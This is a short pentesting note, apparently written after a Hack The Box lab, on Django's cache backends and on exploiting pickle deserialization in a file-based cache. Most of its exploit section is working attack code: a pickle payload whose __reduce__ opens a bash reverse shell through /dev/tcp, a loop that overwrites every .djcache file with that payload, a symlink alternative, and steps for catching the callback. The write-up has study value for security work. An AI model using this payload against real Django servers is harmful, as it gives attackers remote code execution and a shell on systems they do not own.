A built in feature of the Django framework that provides tools to implement caching strategies for Django web applications.

Django supports the following types of caching:

- In memory caching
- Filesystem caching
- Database caching
- Memcache
- Redis
- Custom cache backends

The type of caching strategy used is usually found in the `settings.py` file. It resemble the following:

```python 
CACHES = {
    "default": {
        "BACKEND": "django.core.cache.backends.memcached.PyMemcacheCache",
        "LOCATION": "unix:/tmp/memcached.sock",
    }
}
```

# Pickle Deserialization in Django Caches

## Pickle

A module in Python that lets you serialize and deserialize data. Meaning you can break down a python object into a byte stream that can be rebuilt in a different context by loading said byte stream.

## Exploit

Django caches are pickled objects. Which means **IF WE CAN WRITE TO ONE OF THESE CACHES, WE CAN EXECUTE ARBITRARY CODE**. 

We create a new (and poisoned) cache that executes the code we cant as soon as the Django app deserializes it. The mechanism is largely the same for each type of caching. The example below uses **Filesystem Caching**. Its from the machine `HackNet` on HTB.

```python
CACHES = {
    "default": {
        "BACKEND": "django.core.cache.backends.filebased.FileBasedCache",
        "LOCATION": "/var/tmp/django_cache",
	    "TIMEOUT":60,
	     "OPTIONS": {'MAX_ENTRIES': 10000}
	 }
 }
```

Check if we can write to the `/var/tmp/django_cache` folder. 

If this is doable, we should look for any existing `.djcache` files. We're going to either replace them with our poisoned files, or symlink or files to one of these cache files.

Here's a generic script that creates a pickled payload that can be linked, or replace the existing files

```python title=picklescript fold
import pickle
import base64
import os

class RCE:
	def __reduce__(self):
        cmd = ("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'",)
        return os.system, cmd

if __name__ == '__main__':
	payload = pickle.dumps(RCE())
	# Prints a base64 version that can be used in another script to replace the existing pickle
	print(base64.urlsafe_b64encode(payload))
	
	# Writes a file with the poison pickle that we have to link to the existing cache files using a symlink
	with open("poison.pickle", "wb") as f:
		f.write(payload)
```

In the case of the base64 pickledump, we can use the following one liner to replace all the `.djcache` files with our poison pickle.

```bash
for i in $(ls *.djcache); do (rm -f $i; echo '<bass64-pickled-data>' | base64 -d > $i); done
```

Alternatively, we can use a symlink on our poison pickle file and link it to an existing `.djcache` file.

```sh
ln -s poision.pickle <name of cache file>.djcache
```

Lastly, run a listener for reverse shells. 

Then just refresh the application/view that deals with this caching part, and wait for a callback on the reverse shell.

# References

https://davidhamann.de/2020/04/05/exploiting-python-pickle/

https://notes.subh.space/linux-privilege-escalation/django-cache-rce

https://dev.to/pragativerma18/django-caching-101-understanding-the-basics-and-beyond-49p